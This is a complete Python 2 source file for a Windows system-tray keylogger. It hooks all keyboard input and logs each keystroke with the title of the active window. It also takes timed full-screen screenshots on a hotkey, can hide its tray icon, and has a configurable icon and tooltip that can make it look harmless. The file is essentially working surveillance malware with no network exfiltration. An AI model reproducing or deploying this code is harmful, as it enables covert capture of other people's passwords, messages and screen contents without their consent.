import Tkinter as tk
import ttk
import sys
import os
from libs.systray import systray
from PIL import ImageGrab
from time import strftime
import pythoncom
import pyHook
import ConfigParser
from win32gui import GetWindowText, GetForegroundWindow

load_config = ConfigParser.ConfigParser()
load_config.read('config.cfg')

load_tooltip = load_config.getboolean('Settings', 'tooltip')
load_systray_app_title = load_config.get('Settings', 'systray_app_title')
load_systray_app_body = load_config.get('Settings', 'systray_app_body')
load_default_icon = load_config.get('Settings', 'default_icon')
load_icon_2 = load_config.get('Settings', 'icon_2')
load_icon_3 = load_config.get('Settings', 'icon_3')
load_dir_icons = load_config.get('Settings', 'dir_icons')
load_dir_images = load_config.get('Settings', 'dir_images')
load_dir_logs = load_config.get('Settings', 'dir_logs')
load_log_file = load_config.get('Settings', 'logfile')
load_default_icon = load_dir_icons + load_default_icon
load_logs_file = load_dir_logs + load_log_file
if not os.path.exists(load_dir_icons) or not os.path.exists(load_dir_images) or not os.path.exists(load_dir_logs):
    sys.exit(1)


def key_log_start(s):
    def foreground_window():
        fg_window = GetWindowText(GetForegroundWindow())
        count = len(fg_window)
        lines = '-' * count + '----'
        return '\n' + lines + '\n\n| ' + fg_window + ' |\n\n' + lines + '\n'

    fl = open('logs/dump.txt', 'a')
    fl.write('Start Keylog...\n')
    fl.close()

    def on_keyboard_event(event):
        if event.Ascii == 27:
            f = open(load_logs_file, 'a')
            f.write('\t[Escape]\n')
            f.write('Closing Keylog...\n')
            f.close()
            sys.exit(1)

        if event.Ascii != 0:
            f = open(load_logs_file, 'a')
            key_logs = chr(event.Ascii)
            if event.Ascii == 13:
                key_logs = '[ENTER]\n'
            elif event.Ascii == 8:
                key_logs = '[BACKSPACE]'
            elif event.Ascii == 96 or event.Ascii == 126:
                screenshot(s)
                key_logs = '\n' + foreground_window() + ' [SCREENSHOT] ' + strftime('%m/%d/%Y %H:%M:%S') + '\n'
            elif event.Ascii == 45:
                s.hide()
            elif event.Ascii == 43:
                s.show()
            f.write(key_logs)
            f.close()

    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    pythoncom.PumpMessages()


key_log_menu = systray.Menu(title="Keylog", name="Keylog_Menu")
menu_item_key_log_start = systray.MenuItem(title="Start", name="menuitem_keylog_start")
key_log_menu.add_menuitem(menu_item_key_log_start)
menu_item_key_log_start.onclick = key_log_start


def check_log_file(s):
    root = tk.Tk()
    text = tk.Text(root)

    def save_log_file():
        f = open(load_logs_file, 'w')
        f.write(text.get('1.0', tk.END))
        f.close()
        root.destroy()

    fl = open(load_logs_file, 'r')
    text.insert(tk.END, fl.read())
    text.pack()
    fl.close()
    frame = tk.Frame(root)
    frame.pack()
    button1 = ttk.Button(frame, text='Save', command=save_log_file)
    button1.pack(side=tk.LEFT, padx=20, pady=10)
    button2 = ttk.Button(frame, text='Close', command=root.destroy)
    button2.pack(side=tk.LEFT, padx=20, pady=10)
    root.mainloop()


menu_item_check_log_file = systray.MenuItem(title="Open Logs", name="check_log_file")
key_log_menu.add_menuitem(menu_item_check_log_file)
menu_item_check_log_file.onclick = check_log_file


def screenshot(s):
    img = ImageGrab.grab()
    save_as = os.path.join(strftime('%m-%d-%Y-%H-%M-%S')+'.png')
    img.save(load_dir_images + save_as)


screenshot_menu = systray.Menu(title="Screenshot", name="Screenshot_Menu")
menu_item_screenshot = systray.MenuItem(title="Take", name="menuitem_Screenshot")
screenshot_menu.add_menuitem(menu_item_screenshot)
menu_item_screenshot.onclick = screenshot


def help(s):
    root = tk.Tk()
    tk.Label(root, text='Press [ ` ] or [ ~ ] to take a screenshot').grid(sticky=tk.W)
    tk.Label(root, text='Press [ - ] to hide the system tray').grid(sticky=tk.W)
    tk.Label(root, text='Press [ + ] to show the system tray').grid(sticky=tk.W)
    tk.Label(root, text='Press [ ESC ] to quit').grid(sticky=tk.W)
    tk.Label(root, text='').grid(sticky=tk.W)
    tk.Label(root, text='Note: Keylog only close with [ESC]').grid(sticky=tk.W)
    ttk.Button(root, text='Close', command=root.destroy).grid(pady=5)
    root.mainloop()


help_menu = systray.Menu(title="Help", name="Help_Menu")
menu_item_help = systray.MenuItem(title="Help", name="menuitem_Help")
help_menu.add_menuitem(menu_item_help)
menu_item_help.onclick = help


def default_icon(s):
    s.icon = load_dir_icons + load_default_icon


def icon_2(s):
    s.icon = load_dir_icons + load_icon_2


def icon_3(s):
    s.icon = load_dir_icons + load_icon_3


change_icon_menu = systray.Menu(title="Change Icon", name="ChangeIcon")

menu_item_default_icon = systray.MenuItem(title='Default', name="menuitem_Default_icon")
change_icon_menu.add_menuitem(menu_item_default_icon)
menu_item_default_icon.onclick = default_icon

menu_item_icon_2 = systray.MenuItem(title='Icon 2', name="menuitem_Icon2")
change_icon_menu.add_menuitem(menu_item_icon_2)
menu_item_icon_2.onclick = icon_2

menu_item_icon_3 = systray.MenuItem(title='Icon 3', name="menuitem_Icon3")
change_icon_menu.add_menuitem(menu_item_icon_3)
menu_item_icon_3.onclick = icon_3


def settings(s):
    get_config = ConfigParser.ConfigParser()
    get_config.read('config.cfg')
    tooltip = get_config.getboolean('Settings', 'tooltip')
    systray_app_title = get_config.get('Settings', 'systray_app_title')
    systray_app_body = get_config.get('Settings', 'systray_app_body')
    root = tk.Tk()

    def save_settings():
        write_config = ConfigParser.RawConfigParser()
        write_config.read('config.cfg')

        if v.get() == 1:
            tooltip_v = 'True'
        else:
            tooltip_v = 'False'

        write_config.set('Settings', 'tooltip', tooltip_v)
        write_config.set('Settings', 'systray_app_title', entry1.get())
        write_config.set('Settings', 'systray_app_body', entry2.get())
        with open('config.cfg', 'w+') as configfile:
            write_config.write(configfile)

        tk.Label(root, text='Enable - Disable Tooltip').grid(sticky=tk.W)
        root.destroy()
    frame1 = tk.Frame(root)
    frame1.grid()
    v = tk.IntVar()

    if tooltip:
        v.set('1')
    else:
        v.set('2')

    ttk.Radiobutton(frame1, text='True', variable=v, value=1).grid(row=0, column=0, padx=5)
    ttk.Radiobutton(frame1, text='False', variable=v, value=2).grid(row=0, column=1, padx=5)
    tk.Label(root, text='Set the Tooltip Text Title').grid(sticky=tk.W, pady=5)
    entry1 = tk.Entry(root)
    entry1.insert(tk.END, systray_app_title)
    entry1.grid(pady=5)
    tk.Label(root, text='Set the Tooltip Text Body').grid(sticky=tk.W, pady=5)
    entry2 = tk.Entry(root)
    entry2.insert(tk.END, systray_app_body)
    entry2.grid(pady=5)
    frame2 = tk.Frame(root)
    frame2.grid()
    ttk.Button(frame2, text='Save', command=save_settings).grid(row=0, column=0, pady=10, padx=5)
    ttk.Button(frame2, text='Close', command=root.destroy).grid(row=0, column=1, pady=10, padx=5)
    root.mainloop()


settings_menu = systray.Menu(title="Settings", name="Settings_Menu")
menu_item_settings = systray.MenuItem(title="Edit", name="menuitem_Settings")
settings_menu.add_menuitem(menu_item_settings)
menu_item_settings.onclick = settings

key_log_me_app = systray.App(load_systray_app_title, load_default_icon)


def on_load(s):
    s.show_tooltip(load_systray_app_title, load_systray_app_body)


if load_tooltip:
    key_log_me_app.on_load = on_load
else:
    pass

key_log_me_app.add_menu(key_log_menu)
key_log_me_app.add_menu(screenshot_menu)
key_log_me_app.add_menu(change_icon_menu)
key_log_me_app.add_menu(settings_menu)
key_log_me_app.add_menu(help_menu)
key_log_me_app.start()
